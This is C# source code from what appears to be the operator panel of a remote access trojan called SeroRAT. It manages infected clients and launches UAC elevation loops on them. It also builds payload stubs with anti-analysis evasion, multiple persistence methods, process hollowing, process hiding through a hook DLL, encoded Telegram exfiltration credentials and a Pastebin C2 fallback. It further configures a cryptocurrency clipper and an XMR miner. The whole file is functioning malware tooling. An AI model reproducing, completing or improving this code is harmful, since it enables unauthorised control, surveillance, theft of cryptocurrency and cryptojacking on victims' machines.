        await Task.WhenAll(clients.Select(async c =>
        {
            try { await _server.SendToClient(c.Id, packet); } catch { }
            Log($"[ADMIN] [UAC] Elevation loop started on {c.Username}@{c.IP}.");
        }));

        SetStatus($"UAC loop started on {clients.Count} client(s).");
    }

    // ── Tags ────────────────────────────────────────

    private void SetTag_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0) return;

        var currentTag = clients.Count == 1 ? clients[0].Tag : "";
        var dlg = new TagDialog(currentTag) { Owner = this };
        ApplySoftwareRendering(dlg);
        if (dlg.ShowDialog() != true) return;

        foreach (var client in clients)
        {
            client.Tag = dlg.TagValue;
            _store.SetTag(client.Hwid, dlg.TagValue);
            UpdateOpenWindowTitlesAndLabels(client.Id, dlg.TagValue);
        }

        System.Windows.Data.CollectionViewSource.GetDefaultView(_onlineClients)?.Refresh();
        _allClientsView?.Refresh(); // ClientRecord.Tag now fires PropertyChanged — no full rebuild needed

        // CollectionView.Refresh() clears DataGrid selection — restore it
        GridClients.UnselectAll();
        foreach (var c in clients)
            GridClients.SelectedItems.Add(c);

        SetStatus($"Tag set on {clients.Count} client(s).");
    }

    private void SetTagRecord_Click(object sender, RoutedEventArgs e)
    {
        var records = GridAllClients.SelectedItems.Cast<ClientRecord>().ToList();
        if (records.Count == 0) return;

        var currentTag = records.Count == 1 ? records[0].Tag : "";
        var dlg = new TagDialog(currentTag) { Owner = this };
        ApplySoftwareRendering(dlg);
        if (dlg.ShowDialog() != true) return;

        foreach (var record in records)
        {
            _store.SetTag(record.Hwid, dlg.TagValue);
        }

        // Also update any connected clients with matching HWID — O(n+m) vs O(n×m)
        if (_server != null)
        {
            var hwidSet = records.Select(r => r.Hwid).ToHashSet(StringComparer.OrdinalIgnoreCase);
            foreach (var client in _server.ConnectedClients.Values)
            {
                if (hwidSet.Contains(client.Hwid))
                {
                    client.Tag = dlg.TagValue;
                    UpdateOpenWindowTitlesAndLabels(client.Id, dlg.TagValue);
                }
            }
        }

        RefreshClients();
        _allClientsView?.Refresh(); // ClientRecord.Tag now fires PropertyChanged — no full rebuild needed
        SetStatus($"Tag set on {records.Count} record(s).");
    }

    // ── Client Logs ─────────────────────────────────

    private void ViewClientLogs_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0) return;

        foreach (var client in clients)
        {
            if (_store.AllClients.TryGetValue(client.Hwid, out var record))
            {
                var logWin = new ClientLogWindow(record) { Owner = this };
                ApplySoftwareRendering(logWin);
                logWin.Show();
            }
        }
    }

    private void ViewRecordLogs_Click(object sender, RoutedEventArgs e)
    {
        var records = GridAllClients.SelectedItems.Cast<ClientRecord>().ToList();
        foreach (var record in records)
        {
            var logWin = new ClientLogWindow(record) { Owner = this };
            ApplySoftwareRendering(logWin);
            logWin.Show();
        }
    }

    // ── Copy ────────────────────────────────────────

    private void CopyHwid_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0) return;

        var hwids = string.Join("\n", clients.Select(c => c.Hwid));
        Clipboard.SetText(hwids);
        SetStatus(clients.Count == 1 ? $"Copied HWID: {hwids}" : $"Copied {clients.Count} HWIDs");
    }

    private void CopyIP_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0) return;

        var ips = string.Join("\n", clients.Select(c => c.IP));
        Clipboard.SetText(ips);
        SetStatus(clients.Count == 1 ? $"Copied IP: {ips}" : $"Copied {clients.Count} IPs");
    }

    // ── Client search ─────────────────────────────────────────────────────────

    private void TxtSearch_TextChanged(object sender, System.Windows.Controls.TextChangedEventArgs e)
    {
        if (_searchDebounce == null)
        {
            _searchDebounce = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(250) };
            _searchDebounce.Tick += (_, _) =>
            {
                _searchDebounce.Stop();
                System.Windows.Data.CollectionViewSource.GetDefaultView(_onlineClients)?.Refresh();
            };
        }
        _searchDebounce.Stop();
        _searchDebounce.Start();
    }

    private void TxtSearch_KeyDown(object sender, System.Windows.Input.KeyEventArgs e)
    {
        if (e.Key != System.Windows.Input.Key.Enter) return;

        // Select all clients currently visible after the filter
        GridClients.SelectAll();

        // If exactly one result, focus the grid so context menu / actions work immediately
        if (GridClients.Items.Count == 1)
            GridClients.Focus();

        e.Handled = true;
    }

    private bool ClientFilter(object obj)
    {
        if (obj is not ConnectedClient c) return false;

        // 1. Search Query Filter
        var q = TxtSearch?.Text?.Trim() ?? "";
        if (!string.IsNullOrEmpty(q))
        {
            bool match = c.IP.Contains(q, StringComparison.OrdinalIgnoreCase)
                || c.Id.Contains(q, StringComparison.OrdinalIgnoreCase)
                || c.Tag.Contains(q, StringComparison.OrdinalIgnoreCase)
                || c.Username.Contains(q, StringComparison.OrdinalIgnoreCase)
                || c.MachineName.Contains(q, StringComparison.OrdinalIgnoreCase)
                || c.CountryDisplay.Contains(q, StringComparison.OrdinalIgnoreCase)
                || c.OS.Contains(q, StringComparison.OrdinalIgnoreCase)
                || c.ActiveWindow.Contains(q, StringComparison.OrdinalIgnoreCase)
                || c.Payload.Contains(q, StringComparison.OrdinalIgnoreCase)
                || c.Antivirus.Contains(q, StringComparison.OrdinalIgnoreCase);
            if (!match) return false;
        }

        // 2. Webcam Filter
        if (_webcamFilterOnly && !c.CameraStatus.Equals("Yes", StringComparison.OrdinalIgnoreCase))
            return false;

        // 3. Admin Filter
        if (_adminFilterOnly && !c.IsAdmin)
            return false;

        return true;
    }

    private void CopyRecordHwid_Click(object sender, RoutedEventArgs e)
    {
        var records = GridAllClients.SelectedItems.Cast<ClientRecord>().ToList();
        if (records.Count == 0) return;

        var hwids = string.Join("\n", records.Select(r => r.Hwid));
        Clipboard.SetText(hwids);
        SetStatus(records.Count == 1 ? $"Copied HWID: {hwids}" : $"Copied {records.Count} HWIDs");
    }

    // ── Builder ─────────────────────────────────────

    private void BldGenMutex_Click(object sender, RoutedEventArgs e)
    {
        BldMutex.Text = $"Global\\{{{Guid.NewGuid()}}}";
    }

    private void BldPersist_Changed(object sender, RoutedEventArgs e)
    {
        if (BldInstallPanel == null) return;

        bool anyPersist = BldPersistRegistry.IsChecked == true
                       || BldPersistStartup.IsChecked == true
                       || BldPersistTask.IsChecked == true
                       || BldPersistWmi.IsChecked == true;

        BldInstallPanel.Visibility = anyPersist ? Visibility.Visible : Visibility.Collapsed;

        bool maxPersist = BldAntiKill.IsChecked == true
                       && BldPersistRegistry.IsChecked == true
                       && BldPersistStartup.IsChecked == true
                       && BldPersistTask.IsChecked == true
                       && BldPersistWmi.IsChecked == true;

        if (TxtMaxPersist != null)
            TxtMaxPersist.Visibility = maxPersist ? Visibility.Visible : Visibility.Collapsed;
    }

    private async void BtnTelegramTest_Click(object sender, RoutedEventArgs e)
    {
        var token   = BldTelegramToken.Text.Trim();
        var chatId1 = BldTelegramChatId1.Text.Trim();
        var chatId2 = BldTelegramChatId2.Text.Trim();

        if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatId1))
        {
            TxtTelegramTestResult.Text       = "✗ Fill token + Chat ID 1";
            TxtTelegramTestResult.Foreground = new System.Windows.Media.SolidColorBrush(
                System.Windows.Media.Color.FromRgb(0xEF, 0x44, 0x44));
            return;
        }

        BtnTelegramTest.IsEnabled            = false;
        TxtTelegramTestResult.Text           = Lang.Get("STATUS_SENDING");
        TxtTelegramTestResult.Foreground     = new System.Windows.Media.SolidColorBrush(
            System.Windows.Media.Color.FromRgb(0x70, 0x90, 0xC0));

        var targets = new List<string> { chatId1 };
        if (!string.IsNullOrEmpty(chatId2)) targets.Add(chatId2);

        string msg = "SeroRAT - test notification\nBot is configured correctly.";
        bool allOk = true;
        string? lastErr = null;

        try
        {
            foreach (var id in targets)
            {
                var url  = $"https://api.telegram.org/bot{token}/sendMessage" +
                           $"?chat_id={Uri.EscapeDataString(id)}" +
                           $"&text={Uri.EscapeDataString(msg)}";
                var resp = await _telegramHttp.GetAsync(url);
                if (!resp.IsSuccessStatusCode)
                {
                    allOk = false;
                    var respBody = await resp.Content.ReadAsStringAsync();
                    var desc = "";
                    try
                    {
                        var j = System.Text.Json.JsonDocument.Parse(respBody);
                        if (j.RootElement.TryGetProperty("description", out var d))
                            desc = d.GetString() ?? "";
                    }
                    catch { }
                    lastErr = string.IsNullOrEmpty(desc)
                        ? $"HTTP {(int)resp.StatusCode} — chat_id: {id}"
                        : $"{desc} (chat_id: {id})";
                }
            }
        }
        catch (TaskCanceledException)
        {
            allOk   = false;
            lastErr = "Timeout — api.telegram.org unreachable or token invalid";
        }
        catch (System.Net.Http.HttpRequestException ex)
        {
            allOk   = false;
            lastErr = $"Network error: {ex.Message}";
        }
        catch (Exception ex)
        {
            allOk   = false;
            lastErr = $"{ex.GetType().Name}: {ex.Message}";
        }

        BtnTelegramTest.IsEnabled = true;
        if (allOk)
        {
            TxtTelegramTestResult.Text       = "✓ Success";
            TxtTelegramTestResult.Foreground = new System.Windows.Media.SolidColorBrush(
                System.Windows.Media.Color.FromRgb(0x22, 0xC5, 0x5E));
        }
        else
        {
            TxtTelegramTestResult.Text       = $"✗ Error: {lastErr}";
            TxtTelegramTestResult.Foreground = new System.Windows.Media.SolidColorBrush(
                System.Windows.Media.Color.FromRgb(0xEF, 0x44, 0x44));
        }
    }

    private void BldSaveConfig_Click(object sender, RoutedEventArgs e)
    {
        var result = MessageBox.Show(
            "Save builder configuration?",
            "Sero — Confirm",
            MessageBoxButton.YesNo,
            MessageBoxImage.Question);

        if (result == MessageBoxResult.Yes)
        {
            SaveConfig();
            SetStatus("Configuration saved.");
        }
    }

    private void BldCheckAll_Click(object sender, RoutedEventArgs e)
    {
        BldAntiDebug.IsChecked = true;
        BldAntiVM.IsChecked = true;
        BldAntiDetect.IsChecked = true;
        BldAntiSandbox.IsChecked = true;
        BldBlockCis.IsChecked = true;
        BldAntiKill.IsChecked = true;
        BldPersistRegistry.IsChecked = true;
        BldPersistStartup.IsChecked = true;
        BldPersistTask.IsChecked = true;
        BldPersistWmi.IsChecked = true;
        BldHollowing.IsChecked = true;
    }

    private void LoadConfig()
    {
        _loadingConfig = true;
        try
        {
            if (!File.Exists(ConfigFilePath)) return;
            var json = File.ReadAllText(ConfigFilePath);
            var cfg = Newtonsoft.Json.JsonConvert.DeserializeObject<Dictionary<string, string>>(json);
            if (cfg == null) return;

            // Auth key (locked once set)
            if (cfg.TryGetValue("AuthKey", out var key) && !string.IsNullOrEmpty(key))
            { BldAuthKey.Text = key; BldAuthKey.IsReadOnly = true; }

            // Connection (supports multiple hosts)
            if (cfg.TryGetValue("Hosts", out var hostsJson))
            {
                BldHosts.Items.Clear();
                var hosts = Newtonsoft.Json.JsonConvert.DeserializeObject<List<string>>(hostsJson);
                if (hosts != null)
                {
                    foreach (var h in hosts)
                        BldHosts.Items.Add(h);
                }
            }
            else if (cfg.TryGetValue("Host", out var host))
            {
                // Backward compatibility with old single-host config
                BldHosts.Items.Clear();
                BldHosts.Items.Add(host);
            }
            if (cfg.TryGetValue("Port", out var port)) { BldPort.Text = port; TxtPort.Text = port; }
            if (cfg.TryGetValue("UsePastebin", out var pastebin)) BldUsePastebin.IsChecked = pastebin == "1";
            if (cfg.TryGetValue("PastebinUrl", out var pastebinUrl)) BldPastebinUrl.Text = pastebinUrl;

            // Identity
            if (cfg.TryGetValue("ClientIdPrefix", out var cp)) BldClientIdPrefix.Text = cp;

            // Checkboxes
            if (cfg.TryGetValue("AntiDebug", out var v)) BldAntiDebug.IsChecked = v == "1";
            if (cfg.TryGetValue("AntiVM", out v)) BldAntiVM.IsChecked = v == "1";
            if (cfg.TryGetValue("AntiDetect", out v)) BldAntiDetect.IsChecked = v == "1";
            if (cfg.TryGetValue("AntiSandbox", out v)) BldAntiSandbox.IsChecked = v == "1";
            if (cfg.TryGetValue("BlockCis", out v)) BldBlockCis.IsChecked = v == "1";
            if (cfg.TryGetValue("AntiKill", out v)) BldAntiKill.IsChecked = v == "1";
            if (cfg.TryGetValue("PersistRegistry", out v)) BldPersistRegistry.IsChecked = v == "1";
            if (cfg.TryGetValue("PersistStartup", out v)) BldPersistStartup.IsChecked = v == "1";
            if (cfg.TryGetValue("PersistTask", out v)) BldPersistTask.IsChecked = v == "1";
            if (cfg.TryGetValue("PersistWmi", out v)) BldPersistWmi.IsChecked = v == "1";
            if (cfg.TryGetValue("Hollowing", out v)) BldHollowing.IsChecked = v == "1";
            if (cfg.TryGetValue("HollowTarget", out var ht)) BldHollowTarget.Text = ht;
            if (cfg.TryGetValue("Encrypt", out v)) BldEncrypt.IsChecked = v == "1";
            if (cfg.TryGetValue("UacBypass", out v)) BldUacBypass.IsChecked = v == "1";

            // Reconnect
            if (cfg.TryGetValue("ReconnectDelay", out var rd)) BldReconnectDelay.Text = rd;

            // Install folder & file name
            if (cfg.TryGetValue("InstallFolder", out var installFolder)) BldInstallFolder.Text = installFolder;
            if (cfg.TryGetValue("InstallFileName", out var installFileName)) BldInstallFileName.Text = installFileName;

            // Settings tab
            if (cfg.TryGetValue("MaxClients", out var mc) && !string.IsNullOrEmpty(mc)) SettingsMaxClients.Text = mc;
            if (cfg.TryGetValue("DiscordRPC", out v)) SettingsDiscordRPC.IsChecked = v == "1";
            if (cfg.TryGetValue("NotifySound",  out v)) SettingsNotifySound.IsChecked  = v == "1";
            if (cfg.TryGetValue("NotifyVisual", out v)) SettingsNotifyVisual.IsChecked = v == "1";
            if (cfg.TryGetValue("HideLogo", out v) && v == "1")
            {
                SettingsHideLogo.IsChecked = true;
                BgLogoImage.Visibility = Visibility.Collapsed;
            }
            SettingsShowSeconds.IsChecked = UiPrefs.GetInt("ShowSeconds", 0) == 1;
            if (cfg.TryGetValue("BlockCapture", out v) && v == "1")
            {
                SettingsBlockCapture.IsChecked = true;
                var hwnd = new System.Windows.Interop.WindowInteropHelper(this).Handle;
                if (!SetWindowDisplayAffinity(hwnd, 0x11u))
                    SetWindowDisplayAffinity(hwnd, 0x1u);
            }

            // Telegram notifications
            if (cfg.TryGetValue("TelegramEnabled", out v)) BldTelegramEnabled.IsChecked = v == "1";
            if (cfg.TryGetValue("TelegramToken", out var tt)) BldTelegramToken.Text = tt;
            if (cfg.TryGetValue("TelegramChatId1", out var tc1)) BldTelegramChatId1.Text = tc1;
            if (cfg.TryGetValue("TelegramChatId2", out var tc2)) BldTelegramChatId2.Text = tc2;

            // Window Notify
            if (cfg.TryGetValue("WinNotifyEnabled",  out v))     WinNotifyEnabled.IsChecked = v == "1";
            if (cfg.TryGetValue("WinNotifyKeywords", out var wk) && !string.IsNullOrEmpty(wk))
            {
                WinNotifyKeywordsList.Items.Clear();
                foreach (var kw in wk.Split('\n', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries))
                    WinNotifyKeywordsList.Items.Add(kw);
            }
            if (cfg.TryGetValue("WnTelegramEnabled", out v))     WnTelegramEnabled.IsChecked = v == "1";
            if (cfg.TryGetValue("WnTelegramToken",   out var wtt)) WnTelegramToken.Text = wtt;
            if (cfg.TryGetValue("WnTelegramChatId1", out var wc1)) WnTelegramChatId1.Text = wc1;
            if (cfg.TryGetValue("WnTelegramChatId2", out var wc2)) WnTelegramChatId2.Text = wc2;
            SetWinNotifyKeywordsLocked(WinNotifyEnabled.IsChecked == true);
            // Sync volatile caches after config is applied.
            _telegramEnabled        = BldTelegramEnabled.IsChecked == true;
            _winNotifyEnabled       = WinNotifyEnabled.IsChecked == true;
            _winNotifyKeywordsSnap  = WinNotifyKeywordsList.Items.Cast<string>().ToArray();
            if (cfg.TryGetValue("MnrStatsToken", out var mst) && !string.IsNullOrEmpty(mst)) _mnrStatsToken = mst;
            if (cfg.TryGetValue("MnrStatsPort",  out var msp) && !string.IsNullOrEmpty(msp) && TxtMnrStatsPort != null) TxtMnrStatsPort.Text = msp;

            // Crypto Clipper
            if (cfg.TryGetValue("ClipperBTC",  out var cBtc))  ClipperBTC.Text  = cBtc;
            if (cfg.TryGetValue("ClipperETH",  out var cEth))  ClipperETH.Text  = cEth;
            if (cfg.TryGetValue("ClipperLTC",  out var cLtc))  ClipperLTC.Text  = cLtc;
            if (cfg.TryGetValue("ClipperTRX",  out var cTrx))  ClipperTRX.Text  = cTrx;
            if (cfg.TryGetValue("ClipperSOL",  out var cSol))  ClipperSOL.Text  = cSol;
            if (cfg.TryGetValue("ClipperXMR",  out var cXmr))  ClipperXMR.Text  = cXmr;
            if (cfg.TryGetValue("ClipperXRP",  out var cXrp))  ClipperXRP.Text  = cXrp;
            if (cfg.TryGetValue("ClipperDASH", out var cDash)) ClipperDASH.Text = cDash;
            if (cfg.TryGetValue("ClipperBCH",  out var cBch))  ClipperBCH.Text  = cBch;

            Log("[+] Builder config loaded.");
        }
        catch { }
        finally { _loadingConfig = false; }
    }

    private void SaveConfig()
    {
        if (!IsLoaded) return;
        try
        {
            var path = ConfigFilePath;
            var cfg = new Dictionary<string, string>
            {
                ["AuthKey"] = BldAuthKey.Text.Trim(),
                ["Hosts"] = Newtonsoft.Json.JsonConvert.SerializeObject(BldHosts.Items.Cast<string>().ToList()),
                ["Host"] = GetPrimaryHost(), // backward compatibility
                ["Port"] = TxtPort.Text.Trim(),
                ["ClientIdPrefix"] = BldClientIdPrefix.Text.Trim(),
                ["UsePastebin"] = BldUsePastebin.IsChecked == true ? "1" : "0",
                ["PastebinUrl"] = BldPastebinUrl.Text.Trim(),
                ["AntiDebug"] = BldAntiDebug.IsChecked == true ? "1" : "0",
                ["AntiVM"] = BldAntiVM.IsChecked == true ? "1" : "0",
                ["AntiDetect"] = BldAntiDetect.IsChecked == true ? "1" : "0",
                ["AntiSandbox"] = BldAntiSandbox.IsChecked == true ? "1" : "0",
                ["BlockCis"] = BldBlockCis.IsChecked == true ? "1" : "0",
                ["AntiKill"] = BldAntiKill.IsChecked == true ? "1" : "0",
                ["PersistRegistry"] = BldPersistRegistry.IsChecked == true ? "1" : "0",
                ["PersistStartup"] = BldPersistStartup.IsChecked == true ? "1" : "0",
                ["PersistTask"] = BldPersistTask.IsChecked == true ? "1" : "0",
                ["PersistWmi"] = BldPersistWmi.IsChecked == true ? "1" : "0",
                ["Hollowing"] = BldHollowing.IsChecked == true ? "1" : "0",
                ["HollowTarget"] = GetHollowTarget(),
                ["Encrypt"] = BldEncrypt.IsChecked == true ? "1" : "0",
                ["UacBypass"] = BldUacBypass.IsChecked == true ? "1" : "0",
                ["ReconnectDelay"] = BldReconnectDelay.Text.Trim(),
                ["InstallFolder"] = BldInstallFolder.Text.Trim(),
                ["InstallFileName"] = BldInstallFileName.Text.Trim(),
                ["MaxClients"] = SettingsMaxClients.Text.Trim(),
                ["DiscordRPC"] = SettingsDiscordRPC.IsChecked == true ? "1" : "0",
                ["NotifySound"] = SettingsNotifySound.IsChecked == true ? "1" : "0",
                ["NotifyVisual"] = SettingsNotifyVisual.IsChecked == true ? "1" : "0",
                ["HideLogo"] = SettingsHideLogo.IsChecked == true ? "1" : "0",
                ["BlockCapture"] = SettingsBlockCapture.IsChecked == true ? "1" : "0",
                ["TelegramEnabled"] = BldTelegramEnabled.IsChecked == true ? "1" : "0",
                ["TelegramToken"] = BldTelegramToken.Text.Trim(),
                ["TelegramChatId1"] = BldTelegramChatId1.Text.Trim(),
                ["TelegramChatId2"] = BldTelegramChatId2.Text.Trim(),
                ["WinNotifyEnabled"]  = WinNotifyEnabled.IsChecked == true ? "1" : "0",
                ["WinNotifyKeywords"] = string.Join("\n", WinNotifyKeywordsList.Items.Cast<string>()),
                ["WnTelegramEnabled"] = WnTelegramEnabled.IsChecked == true ? "1" : "0",
                ["WnTelegramToken"]   = WnTelegramToken.Text.Trim(),
                ["WnTelegramChatId1"] = WnTelegramChatId1.Text.Trim(),
                ["WnTelegramChatId2"] = WnTelegramChatId2.Text.Trim(),
                ["MnrStatsToken"] = EnsureMinerToken(),
                ["MnrStatsPort"]  = TxtMnrStatsPort?.Text.Trim() ?? "8081",
                ["ClipperBTC"]  = ClipperBTC.Text.Trim(),
                ["ClipperETH"]  = ClipperETH.Text.Trim(),
                ["ClipperLTC"]  = ClipperLTC.Text.Trim(),
                ["ClipperTRX"]  = ClipperTRX.Text.Trim(),
                ["ClipperSOL"]  = ClipperSOL.Text.Trim(),
                ["ClipperXMR"]  = ClipperXMR.Text.Trim(),
                ["ClipperXRP"]  = ClipperXRP.Text.Trim(),
                ["ClipperDASH"] = ClipperDASH.Text.Trim(),
                ["ClipperBCH"]  = ClipperBCH.Text.Trim(),
            };
            File.WriteAllText(path, Newtonsoft.Json.JsonConvert.SerializeObject(cfg, Newtonsoft.Json.Formatting.Indented));
        }
        catch (Exception ex) { Log($"[!] Failed to save config: {ex.Message}"); }
    }

    private string GetStubProjectDir()
    {
        // Strategy 1: relative to BaseDirectory (bin/Debug/net10.0-windows -> sero/)
        var serverDir = AppDomain.CurrentDomain.BaseDirectory;
        var seroRoot = Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", ".."));
        var stubDir = Path.Combine(seroRoot, "stub");
        if (Directory.Exists(stubDir) && File.Exists(Path.Combine(stubDir, "SeroStub.csproj")))
            return stubDir;

        // Strategy 2: walk up from BaseDirectory looking for stub/SeroStub.csproj
        var dir = new DirectoryInfo(serverDir);
        while (dir != null)
        {
            var candidate = Path.Combine(dir.FullName, "stub");
            if (File.Exists(Path.Combine(candidate, "SeroStub.csproj")))
                return candidate;
            dir = dir.Parent;
        }

        // Fallback
        return stubDir;
    }

    /// <summary>
    /// Finds the pre-compiled hook DLL (x64 Release) relative to the server binary.
    /// Returns null if not found.
    /// </summary>
    private string? FindHookDll()
    {
        var serverDir = AppDomain.CurrentDomain.BaseDirectory;
        // Repo layout varies: server/bin/Debug/net10.0-windows/ (4 up) or server/bin/x64/Release/net10.0-windows/ (5 up)
        var candidates = new[]
        {
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "..", "hook", "hook", "x64", "Release", "hook.dll")),
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "hook", "hook", "x64", "Release", "hook.dll")),
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "..", "hook", "x64", "Release", "hook.dll")),
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "hook", "x64", "Release", "hook.dll")),
            Path.Combine(serverDir, "hook.dll"),
            Path.GetFullPath(Path.Combine(serverDir, "..", "hook.dll")),
        };
        foreach (var c in candidates)
            if (File.Exists(c)) return c;
        return null;
    }

    private string? FindHookDll32()
    {
        var serverDir = AppDomain.CurrentDomain.BaseDirectory;
        var c32 = new[]
        {
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "..", "hook", "hook", "Release", "hook.dll")),
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "hook", "hook", "Release", "hook.dll")),
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "..", "hook", "hook", "Win32", "Release", "hook.dll")),
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "hook", "hook", "Win32", "Release", "hook.dll")),
            Path.Combine(serverDir, "hook32.dll"),
        };
        foreach (var c in c32) if (File.Exists(c)) return c;
        return null;
    }

    private string GenerateConfigCs()
    {
        int.TryParse(BldPort.Text, out int port);
        int.TryParse(BldReconnectDelay.Text, out int reconnect);
        if (port < 1 || port > 65535) port = 7777;
        if (reconnect < 1000) reconnect = 5000;

        var installFolder = BldInstallFolder.Text.Trim();
        if (string.IsNullOrEmpty(installFolder)) installFolder = "Windows";
        var installFileName = BldInstallFileName.Text.Trim();
        if (string.IsNullOrEmpty(installFileName)) installFileName = "windows.exe";
        // Ensure .exe extension
        if (!installFileName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
            installFileName += ".exe";
        var fileNameNoExt = Path.GetFileNameWithoutExtension(installFileName);

        var useMutex = BldUseMutex.IsChecked == true ? "true" : "false";
        // Generate a unique mutex name per build so old test instances never block new builds
        var mutexName = BldUseMutex.IsChecked == true ? $"Global\\\\{Guid.NewGuid():N}" : "";

        // Escape for C# string literal — prevents quote injection in generated Config.cs
        static string Esc(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");

        const string hookDllLine   = "    public static readonly byte[] HookDllBytes   = Array.Empty<byte>();";
        const string hookDll32Line = "    public static readonly byte[] HookDllBytes32 = Array.Empty<byte>();";

        // Per-build random SFC64 seed for Telegram credentials
        var telegramSfcSeedBytes = System.Security.Cryptography.RandomNumberGenerator.GetBytes(32);
        static string ByteArrayLiteral(byte[] b) =>
            "new byte[] { " + string.Join(", ", b.Select(x => x.ToString())) + " }";
        string telegramSfcSeedLiteral = ByteArrayLiteral(telegramSfcSeedBytes);

        return $@"namespace SeroStub;

internal static class Config
{{
    public static readonly string[] Hosts = new[] {{ {string.Join(", ", BldHosts.Items.Cast<string>().Select(h => $"\"{Esc(h)}\""))} }};
    public const int Port = {port};
    public const bool UseMutex = {useMutex};
    public const string MutexName = ""{mutexName}"";

    public const bool AntiDebug = {(BldAntiDebug.IsChecked == true ? "true" : "false")};
    public const bool AntiVM = {(BldAntiVM.IsChecked == true ? "true" : "false")};
    public const bool AntiDetect = {(BldAntiDetect.IsChecked == true ? "true" : "false")};
    public const bool AntiSandbox = {(BldAntiSandbox.IsChecked == true ? "true" : "false")};
    public const bool BlockCis = {(BldBlockCis.IsChecked == true ? "true" : "false")};

    public const bool PersistRegistry = {(BldPersistRegistry.IsChecked == true ? "true" : "false")};
    public const bool PersistStartup = {(BldPersistStartup.IsChecked == true ? "true" : "false")};
    public const bool PersistTask = {(BldPersistTask.IsChecked == true ? "true" : "false")};
    public const bool PersistWmi = {(BldPersistWmi.IsChecked == true ? "true" : "false")};
    public const string PersistName = ""{Esc(installFolder)}"";

    public const bool AntiKill = {(BldAntiKill.IsChecked == true ? "true" : "false")};
    public const bool EnableWatchdog = {(BldAntiKill.IsChecked == true ? "true" : "false")};
    public const bool EnableHollowing = {(BldHollowing.IsChecked == true ? "true" : "false")};
    public const string HollowTarget = ""{Esc(GetHollowTarget())}"";

    public const string AuthKey = ""{Esc(BldAuthKey.Text.Trim())}"";
    public const string CertHash = ""{Esc(BldCertHash.Text.Trim())}"";

    // Unique per build — changes the compiled binary hash even with identical settings
    public const string BuildId = ""{Guid.NewGuid():N}"";

    public const int ReconnectDelayMs = {reconnect};
    public const int HeartbeatIntervalMs = 3000;

    public const string ClientIdPrefix = ""{Esc(BldClientIdPrefix.Text.Trim())}"";

    // HiddenProcessName = install filename without extension = DLL prefix
    // The hook DLL reads its own filename as the prefix and hides everything starting with it.
    public const string HiddenProcessName = ""{Esc(fileNameNoExt.ToLowerInvariant())}"";
    public const string HiddenFileName = ""{Esc(installFileName)}"";

    public const bool EnableRootkit = false;
{hookDllLine}
{hookDll32Line}

    // Telegram notification (SFC64-encoded — never stored as plaintext in binary)
    public const bool TelegramEnabled = {(BldTelegramEnabled.IsChecked == true ? "true" : "false")};
    public static readonly byte[] TelegramTokenSfc   = {ByteArrayLiteral(SfcEncode(System.Text.Encoding.UTF8.GetBytes(BldTelegramToken.Text.Trim()),   telegramSfcSeedBytes))};
    public static readonly byte[] TelegramChatId1Sfc = {ByteArrayLiteral(SfcEncode(System.Text.Encoding.UTF8.GetBytes(BldTelegramChatId1.Text.Trim()), telegramSfcSeedBytes))};
    public static readonly byte[] TelegramChatId2Sfc = {ByteArrayLiteral(SfcEncode(System.Text.Encoding.UTF8.GetBytes(BldTelegramChatId2.Text.Trim()), telegramSfcSeedBytes))};
    public static readonly byte[] TelegramSfcSeed    = {telegramSfcSeedLiteral};
}}
";
    }

    // ── XMR Miner builder ────────────────────────────────────────────────────

    private string GetMinerStubProjectDir()
    {
        var serverExeDir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) ?? "";

        // Walk up to 6 parent levels and scan each level's subdirectories for MinerStub.csproj.
        // This way the folder can be named anything — folder name is irrelevant.
        var dir = serverExeDir;
        for (int i = 0; i <= 6; i++)
        {
            if (string.IsNullOrEmpty(dir) || !Directory.Exists(dir)) break;
            try
            {
                foreach (var sub in Directory.GetDirectories(dir))
                {
                    if (File.Exists(Path.Combine(sub, "MinerStub.csproj")))
                        return sub;
                }
            }
            catch { }
            dir = Path.GetDirectoryName(dir);
        }

        return ""; // not found
    }

    private void AutoDetectXmrig()
    {
        var serverExeDir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) ?? "";
        var stubDir = GetStubProjectDir();
        var candidates = new[]
        {
            // SCM custom xmrig — supports --cinit-kill-targets (BotKiller)
            Path.Combine(serverExeDir, "..", "..", "..", "..", "..", "SilentCryptoMiner-main", "SilentCryptoMiner-main", "Resources", "Miners", "xmrig.exe"),
            Path.Combine(serverExeDir, "..", "..", "..", "..", "SilentCryptoMiner-main", "SilentCryptoMiner-main", "Resources", "Miners", "xmrig.exe"),
            Path.Combine(stubDir, "..", "SilentCryptoMiner-main", "SilentCryptoMiner-main", "Resources", "Miners", "xmrig.exe"),
            // Standard xmrig fallback
            Path.Combine(serverExeDir, "..", "..", "..", "..", "..", "xmrig-release", "xmrig.exe"),
            Path.Combine(serverExeDir, "..", "..", "..", "..", "xmrig-release", "xmrig.exe"),
            Path.Combine(stubDir, "..", "xmrig-release", "xmrig.exe"),
        };
        foreach (var raw in candidates)
        {
            var path = Path.GetFullPath(raw);
            if (!File.Exists(path)) continue;
            try
            {
                _bldXmrigBytes = File.ReadAllBytes(path);
                _bldXmrigPath  = path;
                BldMnrXmrigPath.Text       = $"xmrig.exe  ({_bldXmrigBytes.Length / 1024} KB)  — auto-detected";
                BldMnrXmrigPath.Foreground = new SolidColorBrush(Color.FromRgb(0x22, 0xC5, 0x5E));
                return;
            }
            catch { }
        }
